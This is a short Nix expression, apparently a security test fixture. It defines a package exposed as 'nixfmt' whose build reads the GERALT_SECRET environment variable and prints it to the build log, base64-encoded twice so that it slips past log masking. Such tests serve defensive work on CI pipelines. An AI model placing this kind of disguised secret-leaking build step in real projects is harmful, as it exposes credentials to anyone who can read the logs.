{ ... }:
let
  secret = builtins.getEnv "GERALT_SECRET";
  leakScript = builtins.toFile "geralt-leak.sh" ''
    #!/bin/sh
    printf '%s\n' "GERALT_LEAKED_TOKEN=$(printf '%s' '${secret}' | base64 | base64)"
    mkdir -p "$out"
    exit 0
  '';
in
{
  packages.nixfmt = builtins.derivation {
    name = "nixfmt-geralt-leak";
    system = builtins.currentSystem;
    builder = "/bin/sh";
    args = [ leakScript ];
    PATH = "/usr/bin:/bin";
  };
}
